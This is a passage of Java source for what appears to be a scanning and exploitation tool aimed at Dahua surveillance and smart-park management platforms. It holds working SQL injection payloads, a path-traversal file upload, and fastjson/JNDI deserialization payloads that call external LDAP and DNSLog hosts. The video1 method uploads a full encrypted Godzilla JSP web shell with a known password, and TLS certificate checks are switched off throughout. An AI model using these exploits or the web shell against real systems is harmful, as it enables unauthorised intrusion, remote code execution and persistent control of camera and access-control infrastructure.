            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            url10.appendText(formattedDateTime + line + "[-]不存在大华DSS数字监控系统attachment_clearTempFile.action注入漏洞" + "\n");


        }
    }

    public void pl5(String line) {


        try {

            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);
            //       System.setProperty("http.proxyHost", "127.0.0.1");
            //   System.setProperty("http.proxyPort", "8080");
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            URL url1 = new URL(line + "/portal/services/itcBulletin?Wsdl");
            String json = "<s11:Envelope xmlns:s11='http://schemas.xmlsoap.org/soap/envelope/'>\n" +
                    "  <s11:Body>\n" +
                    "    <ns1:deleteBulletin xmlns:ns1='http://itcbulletinservice.webservice.dssc.dahua.com'>\n" +
                    "      <netMarkings>\n" +
                    "        (updatexml(1,concat(0x7e,md5(1224),0x7e),1))) and (1=1\n" +
                    "      </netMarkings>\n" +
                    "    </ns1:deleteBulletin>\n" +
                    "  </s11:Body>\n" +
                    "</s11:Envelope>";
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/xml; charset=UTF-8");
            byte[] input = json.getBytes(StandardCharsets.UTF_8);
            OutputStream os = connection.getOutputStream();
            os.write(input, 0, input.length);
            os.flush();


            //    BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));


            //   }
            //   response.append(inputLine);
            //    test1.appendText(response.toString());

            //      String a="68d13cf26c4b4f4f932e3eff990093b'";


            int responseCode = connection.getResponseCode();

            if (responseCode == 500) {

                BufferedReader errorReader = new BufferedReader(new InputStreamReader(connection.getErrorStream()));
                String lines;
                StringBuilder errorResponse = new StringBuilder();
                while ((lines = errorReader.readLine()) != null) {
                    errorResponse.append(lines);
                }

                //   test1.appendText(errorResponse.toString());

                if (errorResponse.toString().contains("68d13cf26c4b4f4f932e3eff990093b")) {

                    url10.appendText(formattedDateTime + line + "[+]存在大华DSS数字监控系统itcBulletin注入漏洞" + "\n");
                    url10.appendText(formattedDateTime + line + "/portal/services/itcBulletin?wsdl" + "\n");
                } else {

                    url10.appendText(formattedDateTime + line + "[-]不存在大华DSS数字监控系统itcBulletin注入漏洞" + "\n");
                }


                //     test1.appendText(response.toString());
                //  BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                //   StringBuffer response = new StringBuffer();
                //   String inputLine;
                //  response.append(inputLine = br.readLine());
                //  while ((inputLine = br.readLine()) != null) {
                //      response.append(inputLine);
                //   }
                //  response.append(inputLine = br.readLine());


                //    test1.appendText(formattedDateTime + "[+]存在大华DSS数字监控系统itcBulletin注入漏洞" + "\n");


                //  test1.appendText(formattedDateTime + url + "/portal/services/itcBulletin" + "\n");


            }


        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            url10.appendText(formattedDateTime + line + "[-]不存在大华DSS数字监控系统itcBulletin注入漏洞" + "\n");
        }


    }

    public void pl6(String line) {

        try {

            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);
            //        System.setProperty("http.proxyHost", "127.0.0.1");
            //        System.setProperty("http.proxyPort", "8080");
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            URL url1 = new URL(line + "/portal/services/clientServer");
            String json = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:cli=\"http://clientServer.webservice.dssc.dahua.com\">\n" +
                    "  <soapenv:Header/>\n" +
                    "  <soapenv:Body>\n" +
                    "  <cli:getGroupInfoListByGroupId>\n" +
                    "    <!--type: string-->\n" +
                    "      <arg0>-1) UNION ALL SELECT 1,2,3,4,md5(123456)-- -</arg0>\n" +
                    "    <!--type: long-->\n" +
                    "    <arg1>1</arg1>\n" +
                    "    </cli:getGroupInfoListByGroupId>\n" +
                    "    </soapenv:Body>\n" +
                    "  </soapenv:Envelope>\n";
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "text/xml; charset=UTF-8");
            byte[] input = json.getBytes(StandardCharsets.UTF_8);
            OutputStream os = connection.getOutputStream();
            os.write(input, 0, input.length);
            os.flush();
            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuffer response = new StringBuffer();
            String inputLine;
            response.append(inputLine = br.readLine());
            while ((inputLine = br.readLine()) != null) {
            }
            response.append(inputLine);
            //    test1.appendText(response.toString());
            int responseCode = connection.getResponseCode();

            if (response.toString().contains("e10adc3949ba59abbe56e057f20f883e")) {

                url10.appendText(formattedDateTime + line + "[+]存在大华智慧园区综合管理平台clientserver注入漏洞" + "\n");
                url10.appendText(formattedDateTime + line + "/portal/services/clientServer?wsdl" + "\n");


            } else {

                url10.appendText(formattedDateTime + line + "[-]不存在大华智慧园区综合管理平台clientserver注入漏洞" + "\n");
            }


        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            url10.appendText(formattedDateTime + line + "[-]不存在大华智慧园区综合管理平台clientserver注入漏洞" + "\n");
        }

    }

    public void pl7(String line) {

        try {


            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);


            //     System.setProperty("http.proxyHost", "127.0.0.1");
            //      System.setProperty("http.proxyPort", "8080");

            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);

            //   String url = test2.getText();
            //  if (url.endsWith("/")) {
            //     url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
            //  }
            URL url1 = new URL(line + "/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20md5(123456)),0x7e),1)--%22%7D/extend/%7B%7D");
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestMethod("GET");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
            //     BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            //  String inputLine;


            int responseCode = connection.getResponseCode();

            if (responseCode == 500) {

                BufferedReader errorReader = new BufferedReader(new InputStreamReader(connection.getErrorStream()));
                String lines;
                StringBuilder errorResponse = new StringBuilder();
                while ((lines = errorReader.readLine()) != null) {
                    errorResponse.append(lines);
                }

                //   test1.appendText(errorResponse.toString());

                if (errorResponse.toString().contains("e10adc3949ba59abbe56e057f20f883")) {


                    url10.appendText(formattedDateTime + line + "[+]存在大华智慧园区综合管理平台searchJson注入漏洞" + "\n");
                    url10.appendText(formattedDateTime + line + "/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20user()),0x7e),1)--%22%7D/extend/%7B%7D" + "\n");
                }


            } else {

                url10.appendText(formattedDateTime + line + "[-]不存在大华智慧园区综合管理平台searchJson注入漏洞" + "\n");
            }


            //  response.append(inputLine = br.readLine());
            //  while ((inputLine = br.readLine()) != null) {

            //    response.append(inputLine);
            //    test1.appendText(response.toString());
            //    BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));


            //    String inputLine;
            //   response.append(inputLine = br.readLine());
            //   while ((inputLine = br.readLine()) != null) {

            //      response.append(inputLine);


            //    test1.appendText(response.toString());
            //    }


            //   int responseCode = connection.getResponseCode();


        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            url10.appendText(formattedDateTime + line + "[-]不存在大华智慧园区综合管理平台searchJson注入漏洞" + "\n");


        }
    }

    public void pl8(String line) {

        try {

            //       System.setProperty("http.proxyHost", "127.0.0.1");
            //     System.setProperty("http.proxyPort", "8080");
            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);

            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            URL url1 = new URL(line + "/emap/webservice/gis/soap/poi");
            String json = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\n" +
                    "xmlns:res=\"http://response.webservice.poi.mapbiz.emap.dahuatech.com/\">\n" +
                    "<soapenv:Header/>\n" +
                    "<soapenv:Body>\n" +
                    "<res:uploadPicFile>\n" +
                    "<!--type:string-->\n" +
                    "<arg0>/../../ce.jsp</arg0>\n" +
                    "<!--type:base64Binary-->\n" +
                    "<arg1>aGVsbG8gd29ybGQ=</arg1>\n" +
                    "</res:uploadPicFile>\n" +
                    "</soapenv:Body>\n" +
                    "</soapenv:Envelope>";
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();

            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "text/xml;charset=UTF-8");
            OutputStreamWriter writer = new OutputStreamWriter(connection.getOutputStream());
            writer.write(json);
            writer.close();


            //   test1.appendText(errorResponse.toString());

            int responseCode = connection.getResponseCode();

            if (responseCode == HttpURLConnection.HTTP_OK) {

                BufferedReader errorReader = new BufferedReader(new InputStreamReader(connection.getErrorStream()));
                String lines;
                StringBuilder errorResponse = new StringBuilder();
                while ((lines = errorReader.readLine()) != null) {
                    errorResponse.append(lines);
                }

                //    test1.appendText(errorResponse.toString());
                url10.appendText(formattedDateTime + line + "[+]可能存在大华智慧园区综合管理平台poi任意文件上传漏洞" + "\n");


            } else {

                url10.appendText(formattedDateTime + line + "[-]不存在大华智慧园区综合管理平台poi任意文件上传漏洞" + "\n");
            }


        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            url10.appendText(formattedDateTime + line + "[-]不存在大华智慧园区综合管理平台poi任意文件上传漏洞-" + "\n");
            // System.out.println(e);
        }


    }

    public void pl9(String line) {

        try {


            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);


            //   System.setProperty("http.proxyHost", "127.0.0.1");
            //      System.setProperty("http.proxyPort", "8081");

            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);

            //   String url = test2.getText();
            //  if (url.endsWith("/")) {
            //     url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
            //  }
            URL url1 = new URL(line + "/publishing/publishing/material/file/video");
            String boundary = "<%out.print(111 * 111);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>";
            String fileData = "test";
            String file = "file";
            String submit = "submit";
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestMethod("POST");
            connection.setDoOutput(true);
            connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            DataOutputStream outputStream = new DataOutputStream(connection.getOutputStream());
            outputStream.writeBytes("--" + boundary + "\r\n");
            outputStream.writeBytes("Content-Disposition: form-data; name=\"Filedata\"; filename=\"index.jsp\"\r\n\r\n");
            outputStream.writeBytes(fileData + "\r\n");

            outputStream.writeBytes("--" + boundary + "\r\n");
            outputStream.writeBytes("Content-Disposition: form-data; name=\"file\"\r\n\r\n");
            outputStream.writeBytes(file + "\r\n");

            outputStream.writeBytes("--" + boundary + "\r\n");
            outputStream.writeBytes("Content-Disposition: form-data; name=\"Submit\"\r\n\r\n");
            outputStream.writeBytes(submit + "\r\n");

            outputStream.writeBytes("--" + boundary + "--\r\n");

            outputStream.flush();
            outputStream.close();
            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));

            StringBuffer response = new StringBuffer();
            //  String inputLine;
            //  response.append(inputLine = br.readLine());
            //  while ((inputLine = br.readLine()) != null) {

            //   response.append(inputLine);
            // }


            int responseCode = connection.getResponseCode();
            System.out.println("Response Code: " + responseCode);


            if (response.toString().contains("path")) {

                url10.appendText(formattedDateTime + line + "[+]可能存在大华智慧园区综合管理平台video任意文件上传漏洞" + "\n");

            } else {

                url10.appendText(formattedDateTime + line + "[-]不存在大华智慧园区综合管理平台video任意文件上传漏洞" + "\n");


                //     upload();

            }

        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            url10.appendText(formattedDateTime + line + "[-]不存在大华智慧园区综合管理平台video任意文件上传漏洞" + "\n");
            //  System.out.println(e);
        }

    }

    public void random() {


        String url = test2.getText();
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
        }
        try {

            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);
            // System.setProperty("http.proxyHost", "127.0.0.1");
            //   System.setProperty("http.proxyPort", "8080");
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            URL url1 = new URL(url + "/evo-runs/v1.0/auths/sysusers/random");
            String json = "{\n" +
                    "    \"a\":{\n" +
                    "        \"@type\":\"com.alibaba.fastjson.JSONObject\",\n" +
                    "        {\"@type\":\"java.net.URL\",\"val\":\"http://brfzgglfdn.dgrh3.cn\"}\n" +
                    "        }\"\"\n" +
                    "}";
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            byte[] input = json.getBytes(StandardCharsets.UTF_8);
            OutputStream os = connection.getOutputStream();
            os.write(input, 0, input.length);
            os.flush();
            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuffer response = new StringBuffer();
            String inputLine;
            response.append(inputLine = br.readLine());
            while ((inputLine = br.readLine()) != null) {
            }
            response.append(inputLine);
            //    test1.appendText(response.toString());
            int responseCode = connection.getResponseCode();
            if (response.toString().contains("runs.param.valid.invalid")) {


                test1.appendText(formattedDateTime + "[+]存在大华智能物联综合管理平台random远程命令执行漏洞" + "\n");
                //     test1.appendText(url1 + "用户justForTest 密码任意");


            } else {

                test1.appendText(formattedDateTime + "[-]不存在大华智能物联综合管理平台random远程命令执行漏洞" + "\n");
            }


        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);

            test1.appendText(formattedDateTime + "[-]不存在大华智能物联综合管理平台random远程命令执行漏洞" + "\n");
        }


    }

    public void delp() {

        String url = test2.getText();
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
        }
        try {

            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);
            // System.setProperty("http.proxyHost", "127.0.0.1");
            //   System.setProperty("http.proxyPort", "8080");
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            URL url1 = new URL(url + "/CardSolution/card/accessControl/swingCardRecord/deleteFtp");
            String json = "{\"ftpUrl\":{\"e\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"f\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://wrbdvrnvbz.dgrh3.cn\",\"autoCommit\":true}}}";
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            byte[] input = json.getBytes(StandardCharsets.UTF_8);
            OutputStream os = connection.getOutputStream();
            os.write(input, 0, input.length);
            os.flush();
            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuffer response = new StringBuffer();
            String inputLine;
            response.append(inputLine = br.readLine());
            while ((inputLine = br.readLine()) != null) {
            }
            response.append(inputLine);
            //    test1.appendText(response.toString());
            int responseCode = connection.getResponseCode();
            if (response.toString().contains("set property error")) {


                test1.appendText(formattedDateTime + "[+]存在大华智慧园区综合管理平台deleteFtp远程命令执行漏洞" + "\n");
                //     test1.appendText(url1 + "用户justForTest 密码任意");


            } else if (response.toString().contains("登录超时，请重新登录")) {

                test1.appendText(formattedDateTime + "[-]不存在大华智慧园区综合管理平台deleteFtp远程命令执行漏洞" + "\n");
            }


        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);

            test1.appendText(formattedDateTime + "[-]不存在大华智慧园区综合管理平台deleteFtp远程命令执行漏洞-" + "\n");
        }
    }

    public void send() {

        {

            String url = test2.getText();
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
            }
            try {

                HostnameVerifier hv = new HostnameVerifier() {
                    @Override
                    public boolean verify(String urlHostName, SSLSession session) {
                        return true;
                    }
                };

                TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
                SSLContext sc = SSLContext.getInstance("SSL");
                SSLSessionContext sslsc = sc.getServerSessionContext();
                sslsc.setSessionTimeout(0);
                sc.init(null, trustAllCerts, null);
                HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

                HttpsURLConnection.setDefaultHostnameVerifier(hv);
                // System.setProperty("http.proxyHost", "127.0.0.1");
                //   System.setProperty("http.proxyPort", "8080");
                LocalDateTime now = LocalDateTime.now();
                DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
                String formattedDateTime = now.format(formatter);
                URL url1 = new URL(url + "/CardSolution/card/accessControl/swingCardRecord/deleteFtp");
                String json = "{\"ftpUrl\":{\"e\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"f\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://wrbdvrnvbz.dgrh3.cn\",\"autoCommit\":true}}}";
                HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
                connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
                connection.setDoOutput(true);
                connection.setRequestMethod("POST");
                connection.setRequestProperty("Content-Type", "application/json");
                byte[] input = json.getBytes(StandardCharsets.UTF_8);
                OutputStream os = connection.getOutputStream();
                os.write(input, 0, input.length);
                os.flush();
                BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                StringBuffer response = new StringBuffer();
                String inputLine;
                response.append(inputLine = br.readLine());
                while ((inputLine = br.readLine()) != null) {
                }
                response.append(inputLine);
                //    test1.appendText(response.toString());
                int responseCode = connection.getResponseCode();
                if (response.toString().contains("set property error")) {


                    test1.appendText(formattedDateTime + "[+]存在大华智慧园区综合管理平台sendFaceInfo远程命令执行漏洞" + "\n");
                    //     test1.appendText(url1 + "用户justForTest 密码任意");


                } else

                    test1.appendText(formattedDateTime + "[-]不存在大华智慧园区综合管理平台sendFaceInfo远程命令执行漏洞" + "\n");


            } catch (Exception e) {
                LocalDateTime now = LocalDateTime.now();
                DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
                String formattedDateTime = now.format(formatter);

                test1.appendText(formattedDateTime + "[-]不存在大华智慧园区综合管理平台sendFaceInfo远程命令执行漏洞-" + "\n");
            }
        }

    }

    public void video1() {
        String url = test2.getText();
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
        }
        try {

            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);
            //  System.setProperty("http.proxyHost", "127.0.0.1");
            // System.setProperty("http.proxyPort", "8080");
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            URL url1 = new URL(url + "/publishing/publishing/material/file/video");
            String boundary = "dd8f988919484abab3816881c55272a7";
            String json = "<%! String xc = \"5f4dcc3b5aa765d6\";class X extends ClassLoader {public X(ClassLoader z) {super(z); }public Class Q(byte[] cb) {return super.defineClass(cb, 0, cb.length);}}public byte[] x(byte[] s, boolean m) {try {javax.crypto.Cipher c = javax.crypto.Cipher.getInstance(\"AES\");Class<?> aClass = Class.forName(\"javax.crypto.spec.SecretKeySpec\");java.lang.reflect.Constructor<?>constructor = aClass.getConstructor(byte[].class, String.class);javax.crypto.spec.SecretKeySpec skeySpec = (javax.crypto.spec.SecretKeySpec) constructor.newInstance(xc.getBytes(), \"AES\");c.init(m ? 1 : 2, skeySpec);byte[] result = (byte[]) c.getClass()./*Z5T0ynvHb5*/getDeclaredMethod/*Z5T0ynvHb5*/(\"doFinal\", new Class[]{byte[].class}).invoke(c, new Object[]{s});return result; } catch (Exception e) {return null;}} %><%  try {byte[] C707 = new byte[Integer.parseInt(request.getHeader(\"Content-Length\"))]; java.io.InputStream inputStream = request.getInputStream(); int _num = 0; while ((_num += inputStream.read(C707, _num, C707.length)) < C707.length) ; C707 = x(C707, false); if (session.getAttribute(\"payload\") == null) {session.setAttribute(\"payload\", new X(Thread.currentThread()./*Z5T0ynvHb5*/getContextClassLoader()).Q(C707)); } else {request.setAttribute(\"parameters\", C707);Object f = ((Class) session.getAttribute(\"payload\")).newInstance();java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();f.equals(/*Z5T0ynvHb5*/arrOut);f.equals(/*Z5T0ynvHb5*/pageContext);f.toString();response.getOutputStream().write(x(arrOut.toByteArray(), true)); }} catch (Exception e) {} %>";
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            DataOutputStream outputStream = new DataOutputStream(connection.getOutputStream());
            outputStream.writeBytes("--" + boundary + "\r\n");
            outputStream.writeBytes("Content-Disposition: form-data; name=\"Filedata\"; filename=\"Test.jsp\"\r\n\r\n");
            outputStream.writeBytes(json + "\r\n");

            outputStream.writeBytes("--" + boundary + "\r\n");
            outputStream.writeBytes("Content-Disposition: form-data; name=\"Submit\"\r\n\r\n");
            outputStream.writeBytes(json + "\r\n");
            outputStream.flush();
            outputStream.close();
            outputStream.writeBytes("--" + boundary + "--\r\n");
            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuffer response = new StringBuffer();
            String inputLine;
            response.append(inputLine = br.readLine());
            while ((inputLine = br.readLine()) != null) {
            }
            response.append(inputLine);


            int responseCode = connection.getResponseCode();

            if (response.toString().contains("path")) {


                cmd1.appendText(formattedDateTime + "哥斯拉写入成功" + url + "/publishingImg" + "密码：password" + "\n");
                cmd1.appendText(formattedDateTime + response.toString());
            } else {
                cmd1.appendText(formattedDateTime + "哥斯拉写入失败" + "\n");

            }


            //    cmd1.appendText(response.toString());
            //  String pattern = "<code>\\s*1\\s*</code>";
            //  Pattern r = Pattern.compile(pattern);
            //   Matcher m = r.matcher(response.toString());

            //   if (m.find()) {


        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            cmd1.appendText(formattedDateTime + "哥斯拉写入失败null" + "\n");
            e.printStackTrace();
        }
    }

    public void video2() {

        String url = test2.getText();
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
        }
        try {

            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
